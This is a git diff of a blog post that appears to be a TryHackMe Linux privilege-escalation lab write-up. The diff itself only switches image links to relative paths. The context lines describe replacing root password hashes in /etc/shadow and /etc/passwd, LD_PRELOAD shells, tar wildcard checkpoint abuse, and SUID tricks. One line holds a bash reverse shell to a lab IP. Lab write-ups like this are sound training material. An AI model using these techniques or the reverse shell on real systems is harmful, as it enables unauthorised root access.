@@ -19,7 +19,7 @@ tags: [privesc, linux]
 
 	`uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)`
 
-	![ssh in](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc1.png)
+	![ssh in](../../assets/img/tryhackme/linuxprivesc/linuxprivesc1.png)
 
 ## Task 2 - Service Exploits
 
@@ -29,7 +29,7 @@ nice, good **mysql** exploit
 
 1. What is the root user's password hash?
 
-	![root password hash](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc2.png)
+	![root password hash](../../assets/img/tryhackme/linuxprivesc/linuxprivesc2.png)
 
 2. What hashing algorithm was used to produce the root user's password hash?
 
@@ -37,13 +37,13 @@ nice, good **mysql** exploit
 
 3. What is the root user's password?
 
-	![hashid and decrypt](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc3.png)
+	![hashid and decrypt](../../assets/img/tryhackme/linuxprivesc/linuxprivesc3.png)
 
 ## Task 4 - Weak File Permissions - Writable /etc/shadow
 
 again, similarily we create the hash for our new password and then replace the root user's hash with it
 
-![change root hash](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc4.png)
+![change root hash](../../assets/img/tryhackme/linuxprivesc/linuxprivesc4.png)
 
 ## Task 5 - Weak File Permissions - Writable /etc/passwd
 
@@ -53,13 +53,13 @@ refer to [this](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-forma
 
 this is the reason by the `x` between the 2nd and 3rd colons (:) in `/etc/passwd` which instructs the system to read the hash from `/etc/shadow`. however, this can be bypassed by replacing the `x` with a password hash which is what we are doing here.
 
-![change root hash in passwd](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc5.png)
+![change root hash in passwd](../../assets/img/tryhackme/linuxprivesc/linuxprivesc5.png)
 
 ## Task 6 - Sudo - Shell Escape Sequences 
 
 running `sudo -l` we get to see the privileges of the current user,
 
-![privs](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc6.png)
+![privs](../../assets/img/tryhackme/linuxprivesc/linuxprivesc6.png)
 
 1. How many programs is "user" allowed to run via sudo?
 
@@ -89,11 +89,11 @@ like the walkthrough says,
 
 this means that we can create a shared object (to spawn a shell) and pass it to this environment variable during the execution of a program (with sudo for root shell) to execute it before the actual program invoked
 
-![preload libs](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc7.png)
+![preload libs](../../assets/img/tryhackme/linuxprivesc/linuxprivesc7.png)
 
 yes, it works even for other libraries, this is due to nature of the source code of the exploits
 
-![change libs](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc8.png)
+![change libs](../../assets/img/tryhackme/linuxprivesc/linuxprivesc8.png)
 
 to elaborate, the contents of `/home/user/tools/sudo/preload.c` is
 
@@ -154,7 +154,7 @@ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
 so, after editing the code in `overwrite.sh`, we listen on our local machine waiting for a shell
 
-![root overwrite](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc9.png)
+![root overwrite](../../assets/img/tryhackme/linuxprivesc/linuxprivesc9.png)
 
 ## Task 9 - Cron Jobs - PATH Environment Variable
 
@@ -172,13 +172,13 @@ tar czf /tmp/backup.tar.gz *
 
 this code zips all the files and folders present in `/home/user` and stores it in `/tmp/backup.tar.gz`. taking help from [gtfobins](https://gtfobins.github.io/gtfobins/tar/), we understand that the flag `--checkpoint` and `--checkpoint-action` can be exploited to execute files. so, when the wildcard is expanded to all the files in the directory, it'll look like `tar czf /tmp/backup.tar.gz file1 file2 --checkpoint=1 --checkpoint-action=exec=shell.elf`
 
-![tar rev shell](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc10.png)
+![tar rev shell](../../assets/img/tryhackme/linuxprivesc/linuxprivesc10.png)
 
 ## Task 11 - SUID / SGID Executables - Known Exploits
 
 pretty straight-forward
 
-![exim vuln](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc11.png)
+![exim vuln](../../assets/img/tryhackme/linuxprivesc/linuxprivesc11.png)
 
 ## Task 12 - SUID / SGID Executables - Shared Object Injection
 
@@ -190,25 +190,25 @@ from the output, our target is `/home/user/.config/libcalc.so` because it doesn'
 
 on compiling and running the exploit, we get root shell access
 
-![misconfig libcalc](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc12.png)
+![misconfig libcalc](../../assets/img/tryhackme/linuxprivesc/linuxprivesc12.png)
 
 ## Task 13 - SUID / SGID Executables - Environment Variables
 
 this privesc also manipulates environment variables and improper definition of executable to gain root shell access
 
-![use the goddamn full name lady](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc13.png)
+![use the goddamn full name lady](../../assets/img/tryhackme/linuxprivesc/linuxprivesc13.png)
 
 ## Task 14 - SUID / SGID Executables - Abusing Shell Features (#1)
 
 this was very interesting. so in bash versions less than 4.2-048, we can define functions that resemble file paths
 
-![i paid for the full name, im going to use the full name](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc14.png)
+![i paid for the full name, im going to use the full name](../../assets/img/tryhackme/linuxprivesc/linuxprivesc14.png)
 
 ## Task 15 - SUID / SGID Executables - Abusing Shell Features (#2)
 
 so, in bash versions less than 4.4 and above, we could define the PS4 variable to display an extra prompt for debugging statements in debugging mode.
 
-![not playstation4](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc15.png)
+![not playstation4](../../assets/img/tryhackme/linuxprivesc/linuxprivesc15.png)
 
 ## Task 16 - Passwords & Keys - History Files
 
@@ -224,7 +224,7 @@ it seems that the user had entered their root password in the command itself
 
 the user had stored his root credentials in `/etc/openvpn/auth.txt` to authenticate for vpn connection
 
-![bad sec practice](https://raw.githubusercontent.com/lordlabuckdas/lordlabuckdas.github.io/gh-pages/assets/img/tryhackme/linuxprivesc/linuxprivesc16.png)
+![bad sec practice](../../assets/img/tryhackme/linuxprivesc/linuxprivesc16.png)
 
 ## Task 18 - Passwords & Keys - SSH Keys
 
